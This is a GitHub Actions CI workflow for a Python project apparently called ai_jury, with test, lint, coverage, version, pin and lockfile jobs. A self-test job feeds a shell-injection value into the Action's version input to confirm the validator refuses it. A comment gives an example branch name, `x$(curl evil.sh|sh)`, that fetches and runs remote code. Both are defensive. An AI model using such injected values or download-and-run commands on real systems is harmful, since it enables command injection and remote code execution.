name: CI

# Authoritative per-push/PR signal: the hosted cross-OS / multi-Python matrix
# plus a coverage gate. The repository is public, so GitHub-hosted minutes are
# free and unlimited — there is no longer any reason to gate this behind a
# self-hosted runner (which would be an arbitrary-code-execution risk on a public
# repo's forked PRs). See docs/architecture.md ("CI & runners").
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  test:
    name: Tests (py${{ matrix.python-version }} · ${{ matrix.os }})
    runs-on: ${{ matrix.os }}
    # Every job here sets one (#697). Without it the ceiling is GitHub's six-hour
    # default, and a resolve that stalls against a slow index holds a required
    # check *open* rather than failing it — worse than a failure, because nothing
    # is reported and nobody is told. The wrappers below are the
    # diagnosis; this is the backstop under them, and the ceiling test in
    # `tests/test_publish_release_chain.py` checks it clears their sum.
    timeout-minutes: 20
    strategy:
      fail-fast: false
      matrix:
        # Full Python-version coverage on Linux; one Python (3.13) on macOS and
        # Windows to prove cross-OS CLI/subprocess behavior while keeping the matrix
        # small and cheap. Every version a classifier declares must appear here —
        # tests/test_release_metadata.py checks it. See docs/architecture.md.
        os: [ubuntu-latest]
        python-version: ["3.11", "3.12", "3.13", "3.14"]
        include:
          - os: macos-latest
            python-version: "3.13"
          - os: windows-latest
            python-version: "3.13"
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97  # v7.0.0
        with:
          python-version: ${{ matrix.python-version }}
      # `timeout(1)` is GNU coreutils and the `macos-latest` runner ships neither
      # it nor `gtimeout`, so a `timeout 300` here exits 127 on that leg before
      # pip is reached — a red required check on every pull request rather than a
      # bound. One step serves every matrix leg, so the bound has to be one
      # they all have, and `bounded` is that: `subprocess.run(timeout=…)`, which
      # kills the child and exits non-zero on Linux, macOS and Windows alike. The
      # interpreter is the one `setup-python` installed in the step above, so it
      # is already here and is the same on every leg.
      #
      # Not perl's `alarm shift; exec @ARGV`, which is the shorter spelling and
      # works on the two POSIX legs: it relies on the alarm surviving an `exec`,
      # and on Windows nothing in this repository can check that it does. A bound
      # that silently is not one is the thing being fixed.
      #
      # Not `pip --timeout` either: that is pip's *socket* timeout, a bound on one
      # quiet read rather than on the call, so a peer that sends a byte inside
      # every window holds the resolve open regardless. Writing it here would look
      # like a bound while adding none, which is worse than the honest gap.
      #
      # `tests/test_publish_release_chain.py` reads `bounded` as a wrapper, counts
      # its seconds against the job's ceiling, and fails if a step calls it
      # without defining it — a function dies with its step, so a call in another
      # one is `command not found` under a name the scan trusts.
      - name: Install package
        # bash on all three runners (git-bash on Windows), so one spelling of the
        # wrapper serves the whole matrix.
        shell: bash
        run: |
          bounded() { python -c 'import subprocess,sys; sys.tracebacklimit=0; sys.exit(subprocess.run(sys.argv[2:], timeout=float(sys.argv[1])).returncode)' "$@"; }
          bounded 120 python -m pip install --upgrade pip
          bounded 300 python -m pip install -e .
      - name: Run offline (mock) unit tests
        run: python -m unittest discover -s tests -v
      - name: Smoke-test the CLI in mock mode
        # bash is available on all three runners (git-bash on Windows), keeping the
        # smoke assertions identical across operating systems.
        shell: bash
        run: |
          python -m ai_jury --mock --diff-file examples/sample.diff -q | tee report.md
          grep -q "AI Jury" report.md
          grep -q "Chair verdict" report.md

  action-self-test:
    # Runs the composite Action itself from this pull request's own tree on all
    # three runner OSes (#900). The unit tests read `action.yml` in pieces; until
    # this job nothing ran it, and #898's install step failed on every
    # windows-latest run (a `\r` from `print()` reached pip) with the whole suite
    # green. It asserts three things: the Action's step exits 0, the package it
    # installs is the version the Action's own `pyproject.toml` declares, and a
    # hostile `version:` is refused by the Action's validator before pip is run.
    #
    # The Action is checked out into `action/` and run as `uses: ./action`, beside
    # a workspace whose own `pyproject.toml` declares another version (#909). Run
    # as `uses: ./`, `$GITHUB_ACTION_PATH` and `$GITHUB_WORKSPACE` were one
    # directory, so an Action that read the caller's `pyproject.toml` instead of
    # its own pinned the same version and passed. Here the workspace root plays a
    # caller's repository: the only other thing in it is that decoy, which names
    # a version no release has.
    #
    # No secrets and no network for the review: `github-token` is passed empty,
    # no key input is passed, and `args: --mock` with `diff-file:` reviews
    # `action/examples/sample.diff` with the mock agents. So it runs the same on a
    # fork's pull request as on this repository's own.
    #
    # The pin cannot come from PyPI: a pull request that bumps the version pins a
    # release that does not exist yet. So the Action's tree, `action/`, is
    # installed first, into the interpreter the Action's own `setup-python` step
    # resolves to (same pinned action, same `python-version`, which
    # `tests/test_action_self_test.py` checks against `action.yml`), and the
    # Action then runs its production install unchanged — the default empty
    # `version:`, pinned from `$GITHUB_ACTION_PATH/pyproject.toml` — with
    # `PIP_NO_INDEX=1`. pip can only satisfy that pin from what is installed, so
    # a pin that names any other version (the decoy's among them) fails the step,
    # and the pip log it writes (`PIP_LOG`) must record the pinned requirement,
    # so an unpinned `ai-jury` fails too. No test-only input or install branch
    # exists in `action.yml` for this.
    name: Action self-test (${{ matrix.os }})
    runs-on: ${{ matrix.os }}
    timeout-minutes: 15
    permissions:
      contents: read
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
    steps:
      # Into a subdirectory, so the Action's own path is not the workspace (#909).
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
        with:
          path: action
          persist-credentials: false
      # Must name the version action.yml's own `Set up Python` step names, so both
      # resolve to one interpreter and the install below is the one the Action sees.
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97  # v7.0.0
        with:
          python-version: "3.13"
      # The decoy: a caller's pyproject.toml, at the workspace root, declaring a
      # version this job never installs. An Action that pinned from the workspace
      # instead of `$GITHUB_ACTION_PATH` would ask pip for it and fail under
      # `PIP_NO_INDEX=1`.
      #
      # The second file is for the hostile run below. bash reads the file
      # `BASH_ENV` names before a non-interactive script, so that run's bash steps
      # append their stderr to a log the step after it can read; the validator's
      # message is how a refusal is told apart from any other failure.
      - name: Lay out a caller workspace that declares another version
        shell: bash
        run: |
          printf '[project]\nname = "ai-jury"\nversion = "0.0.1"\n' > pyproject.toml
          printf 'exec 2>>action-self-test-hostile-stderr.log\n' > action-self-test-hostile-bash-env.sh
      # The one network call in this job: pip fetches the build backend. Bounded
      # with the same `bounded` as the `test` job, because `timeout(1)` is not on
      # the macOS runner.
      - name: Install the Action's tree as the release its pyproject.toml declares
        shell: bash
        run: |
          bounded() { python -c 'import subprocess,sys; sys.tracebacklimit=0; sys.exit(subprocess.run(sys.argv[2:], timeout=float(sys.argv[1])).returncode)' "$@"; }
          bounded 300 python -m pip install ./action
      # Must exit 0: no `continue-on-error`, so any failure here fails the job.
      - name: Run the Action from its own directory (mock, no token, no key)
        id: action
        uses: ./action
        env:
          PIP_NO_INDEX: "1"
          PIP_LOG: action-self-test-pip.log
        with:
          github-token: ""
          args: "--mock --output action-self-test-report.md"
          diff-file: action/examples/sample.diff
      - name: The Action pinned and installed its own version, not the workspace's
        shell: bash
        run: |
          version_of() { python -c 'import sys, tomllib; sys.stdout.write(tomllib.load(open(sys.argv[1], "rb"))["project"]["version"])' "$1"; }
          expected="$(version_of action/pyproject.toml)"
          workspace="$(version_of pyproject.toml)"
          installed="$(jury --version)"
          installed="${installed%$'\r'}"
          echo "action/pyproject.toml declares $expected; the workspace declares $workspace; jury --version says $installed"
          # Without two different versions this job cannot tell the paths apart.
          if [ "$workspace" = "$expected" ]; then
            echo "::error::the workspace declares the Action's own version ($expected), so reading the wrong pyproject.toml would pass"
            exit 1
          fi
          if [ "$installed" != "jury $expected" ]; then
            echo "::error::the Action installed '$installed', expected its own 'jury $expected'"
            exit 1
          fi
          # The log is also the proof PIP_LOG reached the Action's steps, which
          # the hostile case below relies on to say pip never ran.
          if ! grep -qF "ai-jury==$expected in " action-self-test-pip.log; then
            echo "::error::the Action's pip call did not pin ai-jury==$expected"
            exit 1
          fi
          if grep -qF "ai-jury==$workspace" action-self-test-pip.log; then
            echo "::error::the Action pinned the workspace's version, ai-jury==$workspace"
            exit 1
          fi
          grep -q "Chair verdict" action-self-test-report.md
      # Expected to fail, so `continue-on-error` — and the step after it fails the
      # job unless the outcome really is `failure`, and failed for the right reason.
      - name: Run the Action with a hostile version input (must fail)
        id: hostile
        uses: ./action
        continue-on-error: true
        env:
          PIP_LOG: action-self-test-hostile-pip.log
          BASH_ENV: action-self-test-hostile-bash-env.sh
        with:
          github-token: ""
          args: "--mock"
          diff-file: action/examples/sample.diff
          version: '1.0"; echo injected > action-self-test-injected; "'
      - name: The hostile version was refused by the validator before pip ran
        shell: bash
        env:
          HOSTILE_OUTCOME: ${{ steps.hostile.outcome }}
        run: |
          echo "stderr of the hostile run:"
          cat action-self-test-hostile-stderr.log || true
          if [ "$HOSTILE_OUTCOME" != "failure" ]; then
            echo "::error::a hostile version input did not fail the Action (outcome: $HOSTILE_OUTCOME)"
            exit 1
          fi
          # Any failure is `failure`: a broken setup-python too. The validator's
          # own message is what says the install step refused the value.
          if ! grep -qF "ai-jury: version must look like a version number" action-self-test-hostile-stderr.log; then
            echo "::error::the hostile run failed, but not with the validator's refusal"
            exit 1
          fi
          if [ -e action-self-test-hostile-pip.log ]; then
            echo "::error::pip ran with a hostile version input"
            exit 1
          fi
          if [ -e action-self-test-injected ]; then
            echo "::error::the hostile version input was executed as shell"
            exit 1
          fi

  lint:
    name: Lint + format (ruff)
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97  # v7.0.0
        with:
          python-version: "3.13"
      # The bootstrap, and the only install on this path that does not come out
      # of a lock: `uv` itself, hash-locked the way publish.yml's build tooling
      # has been since #712. `release lockfiles resolve` below dry-runs this file
      # on every pull request, so a wheel PyPI stops serving fails there.
      - name: Install uv (hash-locked)
        run: |
          timeout 300 python -m pip install --timeout 30 \
            --require-hashes --only-binary=:all: \
            -r .github/requirements/ci-tools.txt
      # Ruff's version lives in `uv.lock` now, and `tests/test_ruff_pin.py`
      # asserts the lock and the `ruff-format` hook in .pre-commit-config.yaml
      # name the same one. Until #751 this step pinned a ruff by hand while the
      # `coverage` job installed `ruff>=0.6` through the dev extra, so one CI run
      # could hold two formatters — and the lock that would have settled it was
      # tracked, maintained as a release surface, and read by nothing.
      #
      # `--locked` rather than `--frozen`: a lock that no longer matches
      # pyproject.toml has to fail here. `--frozen` would install a stale lock
      # quietly, which is the failure this change exists to end.
      #
      # `--no-install-project` because ruff imports nothing from the package —
      # and because building the project would fetch a build backend this lock
      # does not cover, which is a resolve worth not making at all.
      #
      # `--python` is not optional. uv prefers its own managed interpreters, so
      # without it this job can sync against a Python `setup-python` never
      # installed. `$pythonLocation` is the env var `setup-python` exports, read
      # by bash rather than pasted in as an Actions expression (#683).
      #
      # `.venv/bin` on $GITHUB_PATH is what leaves the two steps below spelled
      # exactly as they were.
      - name: Install ruff from uv.lock
        run: |
          timeout 300 uv sync --locked --no-install-project --extra dev \
            --python "$pythonLocation/bin/python"
          echo "$PWD/.venv/bin" >> "$GITHUB_PATH"
      - name: Lint
        run: ruff check .
      # Without this the tree drifts back: `ruff-format` is a *rewriting* hook,
      # so before #621 anyone who installed the hooks got 38 unrelated files
      # rewritten into their next commit, silently (#621).
      - name: Format
        run: ruff format --check .

  version-integrity:
    # Its own job, not a step in the test matrix, for one reason: the check needs
    # the git tags, and fetching them means a full-history checkout. Paying that
    # on every matrix combination to run the same assertion once per leg is waste;
    # paying it once here is not. #556 — before this, the step ran inside `test`
    # with the default shallow checkout, so `git tag -l` was empty and the
    # monotonicity comparison silently did nothing on every run.
    name: Version integrity (silent-revert guard)
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
        with:
          # actions/checkout defaults to fetch-depth: 1 and fetch-tags: false.
          # Without this the guard cannot see the released tag it compares against.
          fetch-depth: 0
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97  # v7.0.0
        with:
          python-version: "3.13"
      - name: Verify version markers agree and do not regress
        run: python scripts/verify_merge.py --check-version

  bot-push-guard:
    # A bot-owned pull request branch is a read-only input (CONTRIBUTING.md). The
    # bot pushes from its own checkout, so once a human has touched the branch the
    # bot's next push replaces the reviewed tree with its stale copy — that is how
    # #648 silently reverted two merged PRs on 2026-09-03 while the only signal was
    # an unexplained red suite. This job names both commits instead (#676).
    #
    # OPERATOR NOTE — this job is not self-enforcing. On `pull_request` both the
    # workflow and the script are taken from the *pull request head*, so a stale
    # bot push that predates the guard (28d9cc3c on #648 deleted 25 files, two
    # workflows among them) removes the job and GitHub creates no check run for
    # it at all. Nothing in this file can prevent that: the fix is branch
    # protection. Add `Bot push guard` to main's required status checks — a
    # required context that never reports blocks the merge, which is the whole
    # point. The name is load-bearing once it is registered there; renaming it
    # leaves the old context required and never reported, so do not.
    #
    # Pull requests only: there is no branch to reason about on a push to main.
    name: Bot push guard
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    timeout-minutes: 15
    permissions:
      contents: read
      # The commit list is read from the API, not from the checkout, so a
      # force-pushed branch is described by what GitHub has rather than by what a
      # shallow clone happens to contain.
      pull-requests: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97  # v7.0.0
        with:
          python-version: "3.13"
      # The refs come from the event payload, so a branch the rule does not cover
      # is answered without touching the API at all.
      #
      # Every one of them travels through `env:`, and NOTHING below interpolates
      # a `${{ }}` expression into the script. A branch name is attacker-chosen
      # data on a fork pull request and git permits `$( )`, backticks and quotes
      # inside a ref, so an expression pasted into `run:` is substituted into the
      # shell source *before* bash parses it — a branch called
      # `x$(curl evil.sh|sh)` would execute in this job on every pull request.
      # As an environment variable the same name is inert bytes. The offline
      # suite asserts this block stays expression-free.
      - name: Detect a bot push following a human push
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
          HEAD_REF: ${{ github.event.pull_request.head.ref }}
          BASE_REF: ${{ github.event.pull_request.base.ref }}
        # Wrapped even though the scan does not recognise a bare `python` as a
        # network client: this script reads the commit list from the API, so it
        # is a request like any other and a hung one holds this check open.
        run: |
          timeout 120 python scripts/bot_push_after_human_push_check.py \
            --repo "$REPO" \
            --pr "$PR_NUMBER" \
            --head-ref "$HEAD_REF" \
            --base-ref "$BASE_REF"

  coverage:
    name: Coverage gate
    # One dedicated job on a single OS/Python keeps the matrix cheap and avoids
    # cross-OS path noise. The threshold (fail_under) lives in pyproject.toml
    # under [tool.coverage.report].
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97  # v7.0.0
        with:
          python-version: "3.13"
      - name: Install uv (hash-locked)
        run: |
          timeout 300 python -m pip install --timeout 30 \
            --require-hashes --only-binary=:all: \
            -r .github/requirements/ci-tools.txt
      # Was `pip install -e ".[dev]"`, which resolved `ruff>=0.6`, `build>=1.2`
      # and `coverage>=7.5` fresh on every run: a coverage gate whose measuring
      # instrument arrives from somebody else's release schedule, and three open
      # upper bounds behind a required check (#751). They come from `uv.lock`
      # now, hash by hash, and `--locked` fails the job on a lock that no longer
      # matches pyproject.toml — so the lock is exercised rather than merely
      # maintained. See the `lint` job above for why `--python` is spelled out.
      #
      # The project is still installed, unlike in `lint`: coverage measures
      # `ai_jury` by import name. That build resolves `setuptools>=68` in an
      # isolated build environment, which is the one fetch on this path `uv.lock`
      # does not cover — it locks dependencies, not build backends.
      - name: Install package with dev tools (from uv.lock)
        run: |
          timeout 300 uv sync --locked --extra dev \
            --python "$pythonLocation/bin/python"
          echo "$PWD/.venv/bin" >> "$GITHUB_PATH"
      - name: Run tests under coverage
        run: python -m coverage run -m unittest discover -s tests
      - name: Enforce minimum coverage
        run: python -m coverage report
      - name: Generate coverage XML
        if: always()
        run: python -m coverage xml
      - name: Upload coverage report
        if: always()
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a  # v7.0.1
        with:
          name: coverage-xml
          path: coverage.xml
          if-no-files-found: ignore

  action-pins:
    # The offline suite can only check that a pin is *shaped* right. Whether the
    # `# vX.Y.Z` beside a SHA is the version that SHA actually is can only be
    # answered by asking GitHub, so it gets its own job — #549 found nine pins
    # misannotated, four of them off by a whole major version, with every gate
    # green throughout.
    name: Action pins match upstream
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97  # v7.0.0
        with:
          python-version: "3.13"
      - name: Resolve every pinned SHA against its upstream tag
        env:
          AI_JURY_CHECK_PINS: "1"
          # Lifts the anonymous API rate limit; read-only, no extra scope needed.
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: timeout 300 python -m unittest tests.test_action_pins -v

      # Lives in this job because it needs the same thing: network, and a job
      # that is already a required check. The job keeps its name deliberately —
      # renaming it would leave `Action pins match upstream` required in branch
      # protection and never reported, which blocks every merge permanently.
      #
      # tests/test_homebrew_formula.py has had these assertions all along and
      # they never ran: AI_JURY_CHECK_EXTERNAL was set nowhere in CI. A stale
      # digest shipped with 1.15.0 and surfaced as an hourly failure in the tap
      # repository instead (#630).
      #
      # Since #666 the subject is the *tap's* formula, not a copy in this
      # repository — there is no copy here any more. It is never compared with
      # this branch's version: the tap is written after the tag, so it is
      # legitimately behind between a release and its next sync, and failing a
      # pull request over that is the gate that made every release pull request
      # unmergeable. What fails is a tap that cannot install.
      - name: Verify the Homebrew tap serves an installable formula
        env:
          AI_JURY_CHECK_EXTERNAL: "1"
          PYTHONPATH: src
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: timeout 300 python -m unittest tests.test_homebrew_formula -v

      # Same reason again: nothing offline can tell a right Subresource Integrity
      # hash from a wrong one, and a wrong one makes every reader's browser refuse
      # the docs page's scripts. The way that happens is a CDN version bumped
      # without its hash, so the scripts are fetched and hashed here (#817).
      - name: Verify the docs page's CDN scripts match their integrity hashes
        env:
          AI_JURY_CHECK_EXTERNAL: "1"
        run: timeout 300 python -m unittest tests.test_website_sri -v

  release-lockfiles:
    # publish.yml runs only on a v* tag, so a pin in .github/requirements that
    # PyPI no longer serves, or a hash that no longer matches, would surface
    # during a release rather than in CI. Nothing offline can tell a good pin
    # from a bad one — only the real resolver can — so this runs the real thing:
    # same OS, same Python, same flags as publish.yml, minus the install (#712).
    #
    # Since #751 it dry-runs the CI bootstrap on the same terms. That file is
    # not release tooling and the job's name says "release", which is a mismatch
    # the name has to keep: `Release lockfiles resolve` is a required context in
    # main's branch protection, and a required context that is never reported
    # blocks every merge permanently. The name is load-bearing; the coverage is
    # every hash-locked file under .github/requirements.
    name: Release lockfiles resolve
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97  # v7.0.0
        with:
          # Must match publish.yml's Python: the file is locked to one ABI, and
          # resolving it under a different one proves nothing about the release.
          python-version: "3.13"
      - name: Resolve the hash-locked release tooling
        run: |
          timeout 300 python -m pip install --timeout 30 --dry-run \
            --require-hashes --only-binary=:all: \
            --target "$(mktemp -d)" -r .github/requirements/publish-tools.txt
      # The same question about the other file: `lint`, `coverage` and the Pages
      # deploy install `uv` from it before they read `uv.lock`, so a wheel that
      # stops resolving takes out three jobs at once. Resolved here rather than
      # discovered there, and separately from the file above because the two
      # describe different runtimes and a shared resolve would not say which one
      # broke.
      - name: Resolve the hash-locked CI tooling
        run: |
          timeout 300 python -m pip install --timeout 30 --dry-run \
            --require-hashes --only-binary=:all: \
            --target "$(mktemp -d)" -r .github/requirements/ci-tools.txt
